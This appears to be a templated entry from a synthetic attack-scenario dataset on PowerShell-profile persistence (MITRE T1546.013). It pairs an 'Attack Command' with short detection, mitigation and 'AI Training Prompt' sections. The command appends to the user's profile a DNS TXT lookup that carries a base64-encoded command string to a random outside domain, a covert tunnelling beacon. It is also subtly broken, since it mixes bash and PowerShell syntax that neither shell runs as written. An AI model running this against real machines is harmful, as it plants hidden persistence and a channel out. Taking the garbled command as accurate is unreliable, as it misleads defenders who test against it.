---
type: campaign
scenario_id: 379
tactic: Persistence
technique: "T1546.013: PowerShell Profile"
technique_id: T1546.013
tags: [campaign, lotl, persistence]
---

# Adding DNS tunneling script to PowerShell profile.

## Threat Description
Adding DNS tunneling script to PowerShell profile.

## Attack Command
```
echo "Resolve-DnsName -Type TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) | Out-Null" >> $PROFILE.CurrentUserAllHosts
```

## Detection Logic
Monitor PowerShell profiles: `Get-Content $PROFILE.CurrentUserAllHosts | findstr Resolve-DnsName`; Event ID 4663.

## Mitigation
Restrict profile writes: `icacls $PROFILE.CurrentUserAllHosts /deny Everyone:WX`; Audit profile changes: `auditpol /set /subcategory:'File System' /success:enable`.

## AI Training Prompt
Train AI to detect DNS tunneling persistence in PowerShell profiles by analyzing Resolve-DnsName commands, base64-encoded subdomains, and file modifications; suggest profile protections.

## References
- MITRE ATT&CK T1546.013: https://attack.mitre.org/techniques/T1546/013/
- CWE-732: https://cwe.mitre.org/data/definitions/732.html
